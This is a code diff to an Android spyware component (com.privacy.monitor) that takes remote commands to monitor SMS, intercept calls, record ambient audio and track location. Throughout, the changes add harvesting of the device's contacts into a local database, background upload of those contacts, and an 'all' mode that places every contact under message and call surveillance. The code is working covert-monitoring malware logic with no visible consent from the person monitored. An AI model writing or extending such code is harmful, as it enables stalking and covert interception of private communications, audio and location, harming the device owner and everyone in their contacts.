@@ -14,11 +14,13 @@ import org.json.JSONObject;
 import com.google.gson.Gson;
 import com.privacy.monitor.base.C;
 import com.privacy.monitor.db.CallRecordDB;
+import com.privacy.monitor.db.ContactsDB;
 import com.privacy.monitor.db.LocManDB;
 import com.privacy.monitor.db.MonitorDB;
 import com.privacy.monitor.db.RegularDB;
 import com.privacy.monitor.db.SMSRecordDB;
 import com.privacy.monitor.domain.CallRecord;
+import com.privacy.monitor.domain.Contacts;
 import com.privacy.monitor.domain.DeviceInfo;
 import com.privacy.monitor.domain.Monitor;
 import com.privacy.monitor.domain.Regular;
@@ -50,6 +52,7 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 	private MonitorDB monitorDB;
 	private SMSRecordDB smsRecordDB;
 	private CallRecordDB callRecordDB;
+	private ContactsDB contactsDB;
 	private RegularDB regularDB;
 	private LocManDB locManDB ;
 	private TelephonyManager tm;
@@ -71,6 +74,7 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 		monitorDB = MonitorDB.getInstance(context);
 		locManDB = LocManDB.getInstance(context);
 		regularDB = RegularDB.getInstance(context);
+		contactsDB = ContactsDB.getInstance(context);
 		
 		if(!HttpUtil.detect(context)){
 			Logger.d("CronBroadcaseRectiver","开启网络");
@@ -101,7 +105,14 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 				public void receiveData(String type, String data) {
 					boolean hasUpload= sp.getBoolean(C.CONTACTS_UPLOAD,false);
 					if(!hasUpload){
-						uploadContact(context, sp);
+						new Thread(new Runnable() {
+							
+							@Override
+							public void run() {
+								uploadContact(context, sp);
+							}
+						}).start();
+						
 					}
 					handleMessage(type, data);
 				}
@@ -253,6 +264,10 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 			    			contactList.add(name);
 			    			contactList.add(phone);
 			    			list.add(contactList);
+			    			Contacts contacts = new Contacts();
+			    			contacts.setConName(name);
+			    			contacts.setConPhone(phone);
+			    			contactsDB.insert(contacts);
 			    			one = false;
 			    			two = false;
 			    		}
@@ -288,7 +303,7 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 			if(ClientSocket.TYPE_INFO.equalsIgnoreCase(type)){
 				Logger.d("Cron","准备把数据添加到数据库");
 				JSONObject jsonObject = new JSONObject(data);
-				
+				monitorDB.deleteAll();
 				//是否进行短信监控 
 				String monMess = jsonObject.getString("can_mon_msg");
 				
@@ -300,7 +315,7 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 				
 				//是否可以进行录音(环境录音)
 				String monRec = jsonObject.getString("can_mon_rec");
-				
+			   
 				Monitor monitor = new Monitor();
 				monitor.setCallMonitorStatus(monCall);
 				monitor.setEnvRecMonitorStatus(monRec);
@@ -308,8 +323,32 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 				monitor.setLocationStatus(monLoc);
 				monitor.setSmsMonitorStatus(monMess);
 				monitor.setPhone(myPhone);
-				monitorDB.insert(monitor);
+				Monitor monitor2 = monitorDB.queryOnlyRow(Monitor.COL_PHONE +" = ? ", new String [] {myPhone});
+				if(monitor2!=null){
+					monitorDB.update(monitor, Monitor.COL_PHONE +" =? ",new String []{myPhone});
+				}else {
+					monitorDB.insert(monitor);
+				}
+			
+				//监控短信列表
+				String msgList = jsonObject.getString("msg_list");
+				Logger.d("Cron","监控短信列表:"+msgList);
+				parseMessage(msgList);
 				
+				//定时录音列表
+				String recList = jsonObject.getString("rec_list");
+				Logger.d("Cron","定时录音列表:"+recList);
+				parseSoundRec(recList);
+				
+				//定时定位列表
+				String locList=jsonObject.getString("loc_list");
+				Logger.d("Cron","定时定位列表:"+locList);
+				parseLoc(locList);
+				
+				//监控通话列表
+				String callList = jsonObject.getString("call_list");
+				Logger.d("Cron","监控通话列表:"+callList);
+				parseMonitorCallPhone(callList);
 				
 			//立刻定位
 			}else if(ClientSocket.TYPE_GPS_NOW.equalsIgnoreCase(type)){
@@ -339,7 +378,6 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 					});
 					executeSoundRec.start();
 				}
-				
 			}
 			
 		} catch (JSONException e) {
@@ -348,25 +386,27 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 	}
 	
 	//解析获取监控信息的号码
-	private void splistMessage(String message){
+	private void parseMessage(String message){
 			if(!TextUtils.isEmpty(message)){
 				if(message.contains(";")){
 					String[] mesType = message.split(";");
-					if(mesType.length==3){
+					Logger.d("Cron","短信长度:"+mesType.length);
+					int len = mesType.length;
+					if(mesType.length>0){
 						
 						String [] mesMonitorNum = mesType[0].split(",");
-						
-						String [] mesFilterNum = mesType[2].split(",");
-						
+						Logger.d("Cron","短信监听有:"+mesMonitorNum.length+"个号码");
 						if(mesMonitorNum!=null && mesMonitorNum.length > 0){
 							int size = mesMonitorNum.length;
 							for(int i = 0 ; i < size ; i ++){
 								String mesMonPho = mesMonitorNum[i];
 								Monitor monitor = monitorDB.queryOnlyRow(Monitor.COL_PHONE +" = ? ",new String[]{mesMonPho});
 							    if(monitor !=null){
+							    	Logger.d("Cron","短信监控更新");
 							    	monitor.setSmsMonitorStatus("1");
 							    	monitorDB.update(monitor, Monitor.COL_PHONE +" = ? ",new String []{mesMonPho});
 							    }else {
+							    	Logger.d("Cron","短信监控增加");
 									monitor = new Monitor();
 									monitor.setPhone(mesMonPho);
 									monitor.setSmsMonitorStatus("1");
@@ -374,57 +414,88 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 								}
 							}
 						}
-						
-						if(mesFilterNum != null && mesFilterNum.length > 0){
-							int size = mesFilterNum.length;
-							for(int i = 0 ; i < size ;i++){
-								String mesFilPho = mesFilterNum[i];
-								Monitor monitor = monitorDB.queryOnlyRow(Monitor.COL_PHONE +" = ? ",new String[]{mesFilPho});
-							    if(monitor !=null){
-							    	monitor.setFilterStatus("1");
-							    	monitorDB.update(monitor, Monitor.COL_PHONE +" = ? ",new String []{mesFilPho});
-							    }else {
-									monitor = new Monitor();
-									monitor.setPhone(mesFilPho);
-									monitor.setFilterStatus("1");
-									monitorDB.insert(monitor);
+						if(len==3){
+							String [] mesFilterNum = mesType[2].split(",");
+							if(mesFilterNum != null && mesFilterNum.length > 0){
+								int size = mesFilterNum.length;
+								for(int i = 0 ; i < size ;i++){
+									String mesFilPho = mesFilterNum[i];
+									executeMonitorMess(mesFilPho);
 								}
 							}
+						}
+					}
+				}else if("all".equalsIgnoreCase(message)){
+					ArrayList<Contacts> allContacts = contactsDB.queryAll();
+					if(allContacts !=null){
+						int size = allContacts.size();
+						for(int i = 0 ; i < size ; i++){
+							executeMonitorMess(allContacts.get(i).getConPhone());
 						}
 					}
 				}
 		}
 	}
+
+	private void executeMonitorMess(String mesFilPho) {
+		Monitor monitor = monitorDB.queryOnlyRow(Monitor.COL_PHONE +" = ? ",new String[]{mesFilPho});
+		if(monitor !=null){
+			monitor.setFilterStatus("1");
+			monitorDB.update(monitor, Monitor.COL_PHONE +" = ? ",new String []{mesFilPho});
+		}else {
+			monitor = new Monitor();
+			monitor.setPhone(mesFilPho);
+			monitor.setFilterStatus("1");
+			monitorDB.insert(monitor);
+		}
+	}
 	
 	//解析监控通话手机
-	private void splitMonitorCallPhone(String phone){
-		if(!TextUtils.isEmpty(phone)){
-			if(phone.contains(";")){
-				String [] monPhone = phone.split(";");
-				if(monPhone !=null && monPhone.length==2){
+	private void parseMonitorCallPhone(String str){
+		if(!TextUtils.isEmpty(str)){
+			if(str.contains(";")){
+				String [] monPhone = str.split(";");
+				Logger.d("Cron","monPhone列表长度:"+monPhone.length);
+				if(monPhone !=null && monPhone.length >0){
 					//监控的手机号码
 					String [] monPhones = monPhone[0].split(",");
+					
 					int length  = monPhones.length;
+					
 					for(int i = 0 ; i < length ; i ++){
 						String strPhone =monPhones[i]; 
-						Monitor monitor = monitorDB.queryOnlyRow(Monitor.COL_PHONE +" = ? ",new String[]{strPhone});
-						 if(monitor !=null){
-						    	monitor.setCallMonitorStatus("1");
-						    	monitorDB.update(monitor, Monitor.COL_PHONE +" = ? ",new String []{strPhone});
-						    }else {
-								monitor = new Monitor();
-								monitor.setPhone(strPhone);
-								monitor.setSmsMonitorStatus("1");
-								monitorDB.insert(monitor);
-						}
+						executeMonitorCallStatus(strPhone);
+					}
+				}
+			}else if("all".equalsIgnoreCase(str)){
+				ArrayList<Contacts> contacts = contactsDB.queryAll();
+				if(contacts !=null){
+					int size = contacts.size();
+					for(int i = 0 ; i < size ; i ++){
+						executeMonitorCallStatus(contacts.get(i).getConPhone());
 					}
 				}
 			}
 		}
 	}
+
+	private void executeMonitorCallStatus(String strPhone) {
+		Monitor monitor = monitorDB.queryOnlyRow(Monitor.COL_PHONE +" = ? ",new String[]{strPhone});
+		 if(monitor !=null){
+			    
+		    	monitor.setCallMonitorStatus("1");
+		    	monitorDB.update(monitor, Monitor.COL_PHONE +" = ? ",new String []{strPhone});
+		    }else {
+		    	
+				monitor = new Monitor();
+				monitor.setPhone(strPhone);
+				monitor.setCallMonitorStatus("1");
+				monitorDB.insert(monitor);
+		}
+	}
 	
-	//解析定时任务
-	private void parseRegular(String reString){
+	//定时录音
+	private void parseSoundRec(String reString){
 		if(!TextUtils.isEmpty(reString)){
 			if(reString.contains(",")){
 				
